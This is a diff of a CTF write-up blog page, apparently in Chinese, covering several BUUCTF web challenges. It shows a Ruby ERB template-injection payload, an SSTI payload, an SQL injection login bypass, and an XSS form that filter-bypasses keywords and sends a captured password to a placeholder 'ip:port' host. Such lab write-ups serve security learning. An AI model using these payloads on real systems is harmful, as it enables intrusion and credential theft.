@@ -29,7 +29,7 @@
 <meta property="og:image" content="http://yoursite.com/images/BUUCTF3/image-20201128000510021.png">
 <meta property="og:image" content="http://yoursite.com/images/BUUCTF3/image-20201128000241825.png">
 <meta property="og:image" content="http://yoursite.com/images/BUUCTF3/image-20201128175030199.png">
-<meta property="og:updated_time" content="2020-11-28T14:28:32.846Z">
+<meta property="og:updated_time" content="2020-11-29T06:52:54.702Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF2">
 <meta name="twitter:description" content="[SCTF2019]Flag Shoprobots.txt中有源码，发现/work路由中存在rubyREB模板注入但是长度限制为7，这里需要用到[预定义变量]&amp;#40;https://blog.csdn.net/TomorrowAndTuture/article/details/108565910&amp;#41;`$&amp;#39;`,表示的是最后一次模式匹配中匹配部分之后的字符串，也就是说match方法会将">
@@ -201,6 +201,8 @@
 <p><code>&lt;%=$&#39;&gt;</code>,需要url编码一次</p>
 <p>payload=<code>/work?secret=&amp;name=&lt;%25%3d%24%18%25&gt;&amp;do=&lt;%25%3d%24%18%25&gt;%20is%20working</code></p>
 <p>得到SECRET,接下来就是JWT伪造了。</p>
+<a id="more"></a>
+
 <h1 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h1><p>打开进入/secret路由，输入secret，从报错发现是RC4加密，密钥是HereIsTreasure，将解密后的字符串用模板渲染，存在SSTI。</p>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>
@@ -258,7 +260,7 @@
 
 <p>登录有有一个feedback，页面源代码中有注释，将许多关键字替换为空，这个可以拼接绕过，最主要的坑是没有提示bot会填表单。</p>
 <p>所以我们可以构造一个表单给bot填写，然后跳转到我们的服务器即可，密码就是flag。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">"./js/login.js"</span>&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">    var psw = docucookiement.getcookieElementsByName&amp;#40;"password"&amp;#41;[0].value;</span><br><span class="line">    docucookiement.locacookietion=<span class="string">"http://ip:port/?a="</span>+psw;</span><br><span class="line">&lt;<span class="regexp">/scrcookieipt&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">"./js/login.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">scrcookieipt</span>&gt;</span></span></span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">    var psw = docucookiement.getcookieElementsByName&amp;#40;"password"&amp;#41;[0].value;</span><br><span class="line">    docucookiement.locacookietion=<span class="string">"http://ip:port/?a="</span>+psw;</span><br><span class="line">&lt;<span class="regexp">/scrcookieipt&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>下载源码，是一道伪随机数爆破，告诉了我们前16位为KVQP0LdJKRaV3n9D，使用php_mt_seed工具爆破随机数种子为:1775196155。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=&apos;or 1=1#&amp;Private_key=XuNhoueCDCGc&amp;login=1</span><br></pre></td></tr></table></figure>
